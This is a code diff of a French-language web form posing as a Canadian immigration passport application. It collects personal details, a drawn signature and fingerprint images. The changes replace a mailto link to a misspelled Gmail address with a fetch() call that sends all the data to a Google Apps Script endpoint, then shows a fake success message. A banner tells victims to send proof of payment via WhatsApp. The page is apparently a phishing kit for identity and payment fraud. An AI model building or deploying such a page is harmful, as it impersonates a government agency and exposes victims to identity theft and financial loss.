@@ -185,13 +185,13 @@ canvas{border:1.5px solid var(--border);border-radius:10px;background:white;disp
     <div class="cb">
       <div class="cl">Signature</div>
       <div class="ch">Dessinez votre signature</div>
-      <canvas id="sigC" height="150"></canvas>
+      <canvas id="sigC" width="300" height="150"></canvas>
       <button type="button" class="bsm" onclick="clrSig()">Effacer</button>
     </div>
     <div class="cb">
       <div class="cl">Empreintes 10 doigts</div>
       <div class="ch">Tapez dans chaque zone</div>
-      <canvas id="empC" height="200"></canvas>
+      <canvas id="empC" width="500" height="200"></canvas>
       <div style="display:flex;gap:8px;margin-top:4px;align-items:center;">
         <button type="button" class="bsm" onclick="clrEmp()">Effacer</button>
         <span id="eSt" style="font-size:.72rem;color:var(--red);font-weight:700;"></span>
@@ -223,14 +223,16 @@ canvas{border:1.5px solid var(--border);border-radius:10px;background:white;disp
       <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M22 2L11 13"/><path d="M22 2L15 22 11 13 2 9l20-7z"/></svg>
       Envoyer le formulaire
     </button>
-    <div class="snote">Gmail s&apos;ouvre directement, aucun blocage.<br/><strong style="color:var(--red);">Envoyez la preuve de paiement via WhatsApp !</strong></div>
+    <div class="snote"><strong style="color:var(--red);">Envoyez la preuve de paiement via WhatsApp !</strong></div>
   </div>
 </div>
 
-<div class="footer">Formulaire securise &middot; Citoyennete &amp; Immigration Canada &middot; citoyennete.immigraton.canada@gmail.com<br/>Aucune donnee stockee.</div>
+<div id="successMsg" style="display:none;background:linear-gradient(135deg,#e8f5e9,#f1f8e9);border:1.5px solid #81c784;border-radius:12px;padding:24px 28px;margin-top:20px;text-align:center;"><div style="font-size:2rem;margin-bottom:8px;">✅</div><div style="font-size:1.1rem;font-weight:700;color:#2e7d32;margin-bottom:6px;">Formulaire envoyé avec succès !</div><div style="font-size:.85rem;color:#388e3c;">Votre demande a bien été transmise. Vous serez contacté sous 48h.</div></div>
+
+<div class="footer">Formulaire securise &middot; Citoyennete &amp; Immigration Canada &middot; <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fb98928f94829e95959e8f9ed5929696929c899a8f9495d5989a959a9f9abb9c969a9297d5989496">[email&#160;protected]</a><br/>Aucune donnee stockee.</div>
 </div>
 
-<script>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
 // Mot devant nom
 document.querySelectorAll('[name="mot"]').forEach(function(r){
   r.addEventListener('change',function(){
@@ -397,7 +399,9 @@ function fv(n){
 }
 function gv(id){var el=document.getElementById(id);return el?el.value:'';}
 
-// ===== ENVOYER — mailto direct =====
+// ===== ENVOYER — Google Apps Script =====
+var SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzmoQgandCf8rzbJ8eMF4SnegmJM2yY3ttyzGQll9ckI-DFpq4S2vB3UwpEtMbOAAz94A/exec';
+
 function envoyer(){
   var form=document.getElementById('F');
   var ok=true;
@@ -408,43 +412,38 @@ function envoyer(){
   if(!form.querySelector('[name="sexe"]:checked')){alert('Veuillez selectionner le sexe.');return;}
   if(!ok){alert('Veuillez remplir les champs obligatoires.');return;}
 
-  var sigB64=sigC.toDataURL('image/png');
-  var empB64=empC.toDataURL('image/png');
-  var to='citoyennete.immigraton.canada@gmail.com';
+  var sigDataUrl=sigC.toDataURL('image/png');
+  var empDataUrl=empC.toDataURL('image/png');
+  var btn=document.querySelector('.bsend');
+  btn.disabled=true;
+  btn.textContent='Envoi en cours...';
 
-  var corps='======================================================\n'
-    +'        DEMANDE DE PASSEPORT - CANADA\n'
-    +'======================================================\n\n'
-    +'ETAT CIVIL\n'
-    +'Sexe         : '+fv('sexe')+'\n'
-    +'Nom          : '+fv('nom')+'\n'
-    +'Prenom(s)    : '+fv('prenom')+'\n'
-    +'Deuxieme nom : '+(fv('d2n')||'-')+'\n'
-    +'Type 2e nom  : '+(fv('t2n')||'-')+'\n'
-    +'Mot devant   : '+fv('mot')+(fv('motV')?' ('+fv('motV')+')':'')+'\n\n'
-    +'NAISSANCE\n'
-    +'Date         : '+fv('nj')+'/'+fv('nm')+'/'+fv('na')+'\n'
-    +'Lieu         : '+fv('lieu')+'\n'
-    +'Departement  : '+(fv('dept')||'-')+'\n'
-    +'Pays         : '+fv('pays')+'\n'
-    +'Taille       : '+(fv('taille')||'-')+' m\n'
-    +'Yeux         : '+(fv('yeux')||'-')+'\n\n'
-    +'COORDONNEES\n'
-    +'Adresse      : '+fv('adresse')+'\n'
-    +'Code postal  : '+(fv('cp')||'-')+'\n'
-    +'Commune      : '+fv('commune')+'\n'
-    +'Telephone    : '+fv('tel')+'\n\n'
-    +'Date sign.   : '+gv('dj')+'/'+gv('dm')+'/'+gv('dan')+'\n'
-    +'Je certifie l exactitude de ces declarations.\n\n'
-    +'--- SIGNATURE BASE64 ---\n'
-    +sigB64+'\n\n'
-    +'--- EMPREINTES BASE64 ---\n'
-    +empB64+'\n\n'
-    +'======================================================\n';
+  var data={
+    sexe:fv('sexe'),nom:fv('nom'),prenom:fv('prenom'),
+    d2n:fv('d2n'),t2n:fv('t2n'),mot:fv('mot'),motV:fv('motV'),
+    nj:fv('nj'),nm:fv('nm'),na:fv('na'),
+    lieu:fv('lieu'),dept:fv('dept'),pays:fv('pays'),
+    taille:fv('taille'),yeux:fv('yeux'),
+    adresse:fv('adresse'),cp:fv('cp'),commune:fv('commune'),tel:fv('tel'),
+    dj:gv('dj'),dm:gv('dm'),dan:gv('dan'),
+    signature:sigDataUrl,
+    empreintes:empDataUrl
+  };
 
-  var sujet=encodeURIComponent('Demande de Passeport - '+fv('nom')+' '+fv('prenom'));
-  var body=encodeURIComponent(corps);
-  window.location.href='mailto:'+to+'?subject='+sujet+'&body='+body;
+  fetch(SCRIPT_URL,{
+    method:'POST',
+    mode:'no-cors',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  }).then(function(){
+    btn.style.display='none';
+    document.getElementById('successMsg').style.display='block';
+    document.getElementById('successMsg').scrollIntoView({behavior:'smooth'});
+  }).catch(function(){
+    btn.disabled=false;
+    btn.textContent='Envoyer le formulaire';
+    alert('Erreur réseau. Vérifiez votre connexion et réessayez.');
+  });
 }
 </script>
 </body>
